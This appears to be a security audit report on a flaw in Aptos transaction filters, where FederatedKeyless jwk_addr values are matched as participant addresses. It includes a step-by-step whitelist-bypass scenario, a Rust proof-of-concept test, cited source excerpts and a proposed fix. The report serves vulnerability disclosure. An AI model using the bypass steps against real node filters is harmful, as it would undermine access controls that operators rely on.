# Audit Report

## Title
FederatedKeyless JWK Address Manipulation Enables Transaction Filter Bypass

## Summary
The `matches_any_public_key_address()` function in transaction filters incorrectly treats the `jwk_addr` field of `FederatedKeylessPublicKey` as a transaction participant address, when it is actually just a configuration pointer to JWK storage. This semantic error allows attackers to bypass whitelist filters and causes false denials for legitimate users, breaking access control invariants. [1](#0-0) 

## Finding Description

The transaction filter system uses `TransactionMatcher::AccountAddress` to match transactions involving specific addresses (sender, module address, multisig participants, etc.). For `FederatedKeyless` public keys, the filter checks if `jwk_addr` equals the target address. [2](#0-1) 

However, `jwk_addr` is NOT a participant address - it merely indicates where JWKs are stored on-chain for signature verification. The actual sender address is derived from the entire `FederatedKeylessPublicKey` structure (including both `jwk_addr` and the inner `KeylessPublicKey`). [3](#0-2) [4](#0-3) 

**Attack Scenario - Whitelist Bypass:**

1. A validator configures a filter: `Allow(vec![TransactionMatcher::AccountAddress(0xWHITELIST)])`
2. Attacker creates `FederatedKeylessPublicKey { jwk_addr: 0xWHITELIST, pk: <attacker's KeylessPublicKey> }`
3. Attacker's actual address = `hash(BCS(FederatedKeylessPublicKey) || scheme_id)` â‰  0xWHITELIST
4. Filter sees `jwk_addr == 0xWHITELIST` and allows the transaction
5. Transaction from attacker's address (NOT 0xWHITELIST) bypasses the whitelist

For the attack to succeed, the attacker needs:
- 0xWHITELIST must have `FederatedJWKs` published on-chain
- A valid signature against one of those JWKs (achievable if they're for public OIDC providers like Google) [5](#0-4) 

This is confirmed by the test implementation showing that account addresses are derived from the entire `FederatedKeylessPublicKey`: [6](#0-5) 

## Impact Explanation

**Severity: High** (up to $50,000 - Significant protocol violations)

This vulnerability breaks the **Access Control** and **Transaction Validation** invariants by allowing filter bypasses. Transaction filters are used in both mempool and consensus: [7](#0-6) 

**Impacts:**
- **Whitelist Bypass**: Attackers can set `jwk_addr` to match whitelisted addresses, allowing their transactions through filters meant to restrict access to specific participants
- **False Denials**: Legitimate users whose `jwk_addr` matches denied addresses will have transactions incorrectly blocked
- **Rate Limit Evasion**: If filters are used for rate limiting based on addresses, attackers can evade them
- **Consensus Filter Bypass**: Similar issues affect block transaction filters used in consensus validation

This affects all nodes using transaction filters for access control, which could include validators, full nodes, and API nodes. While it doesn't directly cause consensus splits or fund theft, it undermines critical security controls.

## Likelihood Explanation

**Likelihood: Medium to High**

The attack is straightforward to execute:
- No special privileges required
- Attacker only needs to control an OIDC identity (Google account, GitHub account, etc.)
- If the target address has published FederatedJWKs for public providers, exploitation is trivial
- The vulnerability is present in the current codebase and affects any deployment using address-based transaction filters

The main limiting factor is that not all addresses will have FederatedJWKs published, but for addresses that do (especially those deliberately configured for federated authentication), the attack is highly feasible.

## Recommendation

The `matches_any_public_key_address()` function should NOT match based on `jwk_addr` for FederatedKeyless, as this field is not related to transaction participation. The function should return `false` for all FederatedKeyless public keys, similar to how it handles other key types:

```rust
fn matches_any_public_key_address(any_public_key: &AnyPublicKey, address: &AccountAddress) -> bool {
    // Match all variants explicitly to ensure future enum changes are caught during compilation
    match any_public_key {
        AnyPublicKey::Ed25519 { .. }
        | AnyPublicKey::Secp256k1Ecdsa { .. }
        | AnyPublicKey::Secp256r1Ecdsa { .. }
        | AnyPublicKey::SlhDsa_Sha2_128s { .. }
        | AnyPublicKey::Keyless { .. }
        | AnyPublicKey::FederatedKeyless { .. } => false,  // Changed: FederatedKeyless now returns false
    }
}
```

The `jwk_addr` field should only be used during signature verification to locate JWKs, never for transaction filtering or address matching purposes.

## Proof of Concept

```rust
#[test]
fn test_federated_keyless_filter_bypass() {
    use aptos_types::{
        keyless::{FederatedKeylessPublicKey, KeylessPublicKey, test_utils::get_sample_groth16_sig_and_pk},
        transaction::authenticator::{AnyPublicKey, AuthenticationKey, AccountAuthenticator, SingleKeyAuthenticator, AnySignature},
    };
    use move_core_types::account_address::AccountAddress;
    
    // Target whitelist address
    let whitelist_address = AccountAddress::from_hex_literal("0x1234").unwrap();
    
    // Get a sample keyless public key (attacker's identity)
    let (_, keyless_pk) = get_sample_groth16_sig_and_pk();
    
    // Create FederatedKeyless with jwk_addr set to whitelist address
    let fed_pk = FederatedKeylessPublicKey {
        jwk_addr: whitelist_address,  // Attacker sets this to match whitelist
        pk: keyless_pk,
    };
    
    // Derive the actual account address - this will be DIFFERENT from whitelist_address
    let actual_address = AuthenticationKey::any_key(
        AnyPublicKey::federated_keyless(fed_pk.clone())
    ).account_address();
    
    // Verify addresses are different
    assert_ne!(actual_address, whitelist_address, 
        "Attack fails: addresses should be different");
    
    // Create authenticator with the FederatedKeyless public key
    let authenticator = AccountAuthenticator::SingleKey {
        authenticator: SingleKeyAuthenticator::new(
            AnyPublicKey::federated_keyless(fed_pk.clone()),
            AnySignature::Ed25519 { 
                signature: aptos_crypto::ed25519::Ed25519Signature::dummy_signature() 
            },
        ),
    };
    
    // The filter will match whitelist_address because jwk_addr == whitelist_address
    let matches = matches_account_authenticator_address(&authenticator, &whitelist_address);
    
    // This should be false but is currently true - demonstrating the vulnerability
    assert!(matches, "Vulnerability: Filter matches based on jwk_addr");
    
    println!("VULNERABILITY DEMONSTRATED:");
    println!("Whitelist address:     {}", whitelist_address);
    println!("Actual sender address: {}", actual_address);
    println!("Filter matched: {}", matches);
    println!("This allows bypass of whitelist filters!");
}
```

This PoC demonstrates that an attacker can create a `FederatedKeylessPublicKey` with `jwk_addr` set to any target address, causing filters to match that address even though the actual transaction sender is a completely different address.

## Notes

The vulnerability exists because transaction filters were designed before FederatedKeyless was fully implemented, and the semantic meaning of `jwk_addr` as a configuration field (rather than a participant address) was not properly reflected in the filter matching logic. The fix is straightforward but requires careful testing to ensure no legitimate use cases depend on this behavior.

### Citations

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L29-47)
```rust
    /// Returns true iff the filter allows the transaction
    pub fn allows_transaction(&self, signed_transaction: &SignedTransaction) -> bool {
        // If the filter is empty, allow the transaction by default
        if self.is_empty() {
            return true;
        }

        // Check if any rule matches the transaction
        for transaction_rule in &self.transaction_rules {
            if transaction_rule.matches(signed_transaction) {
                return match transaction_rule {
                    TransactionRule::Allow(_) => true,
                    TransactionRule::Deny(_) => false,
                };
            }
        }

        true // No rules match (allow the transaction by default)
    }
```

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L197-203)
```rust
            TransactionMatcher::AccountAddress(address) => {
                matches_sender_address(signed_transaction, address)
                    || matches_entry_function_module_address(signed_transaction, address)
                    || matches_multisig_address(signed_transaction, address)
                    || matches_script_argument_address(signed_transaction, address)
                    || matches_transaction_authenticator_address(signed_transaction, address)
            },
```

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L312-325)
```rust
fn matches_any_public_key_address(any_public_key: &AnyPublicKey, address: &AccountAddress) -> bool {
    // Match all variants explicitly to ensure future enum changes are caught during compilation
    match any_public_key {
        AnyPublicKey::Ed25519 { .. }
        | AnyPublicKey::Secp256k1Ecdsa { .. }
        | AnyPublicKey::Secp256r1Ecdsa { .. }
        | AnyPublicKey::SlhDsa_Sha2_128s { .. }
        | AnyPublicKey::Keyless { .. } => false,
        AnyPublicKey::FederatedKeyless { public_key } => {
            // Check if the public key's JWK address matches the given address
            public_key.jwk_addr == *address
        },
    }
}
```

**File:** types/src/keyless/mod.rs (L372-379)
```rust
/// Unlike a normal keyless account, a "federated" keyless account will accept JWKs published at a
/// specific contract address.
#[derive(Clone, Debug, Eq, PartialEq, Hash, Serialize, Deserialize)]
#[cfg_attr(feature = "fuzzing", derive(arbitrary::Arbitrary))]
pub struct FederatedKeylessPublicKey {
    pub jwk_addr: AccountAddress,
    pub pk: KeylessPublicKey,
}
```

**File:** types/src/transaction/authenticator.rs (L923-926)
```rust
    /// Create an authentication key from an AnyPublicKey
    pub fn any_key(public_key: AnyPublicKey) -> AuthenticationKey {
        Self::from_preimage(public_key.to_bytes(), Scheme::SingleKey)
    }
```

**File:** aptos-move/aptos-vm/src/keyless_validation.rs (L235-260)
```rust
    for (pk, sig) in authenticators {
        // Try looking up the jwk in 0x1.
        let jwk = match get_jwk_for_authenticator(&patched_jwks.jwks, pk.inner_keyless_pk(), sig) {
            // 1: If found in 0x1, then we consider that the ground truth & we are done.
            Ok(jwk) => jwk,
            // 2: If not found in 0x1, we check the Keyless PK type.
            Err(e) => {
                match pk {
                    // 2.a: If this is a federated keyless account; look in `jwk_addr` for JWKs
                    AnyKeylessPublicKey::Federated(fed_pk) => {
                        let federated_jwks =
                            get_federated_jwks_onchain(resolver, &fed_pk.jwk_addr, module_storage)
                                .map_err(|_| {
                                    invalid_signature!(format!(
                                        "Could not fetch federated PatchedJWKs at {}",
                                        fed_pk.jwk_addr
                                    ))
                                })?;
                        // 2.a.i If not found in jwk_addr either, then we fail the validation.
                        get_jwk_for_authenticator(&federated_jwks.jwks, pk.inner_keyless_pk(), sig)?
                    },
                    // 2.b: If this is not a federated keyless account, then we fail the validation.
                    AnyKeylessPublicKey::Normal(_) => return Err(e),
                }
            },
        };
```

**File:** aptos-move/e2e-move-tests/src/tests/keyless_feature_gating.rs (L432-453)
```rust
fn create_federated_keyless_account(
    h: &mut MoveHarness,
    jwk_addr: AccountAddress,
    pk: KeylessPublicKey,
) -> Account {
    let fed_pk = FederatedKeylessPublicKey { jwk_addr, pk };
    let addr = AuthenticationKey::any_key(AnyPublicKey::federated_keyless(fed_pk.clone()))
        .account_address();
    let account = h.store_and_fund_account(
        &Account::new_from_addr(
            addr,
            AccountPublicKey::AnyPublicKey(AnyPublicKey::FederatedKeyless { public_key: fed_pk }),
        ),
        100000000,
        0,
    );

    println!("Actual address: {}", addr.to_hex());
    println!("Account address: {}", account.address().to_hex());

    account
}
```
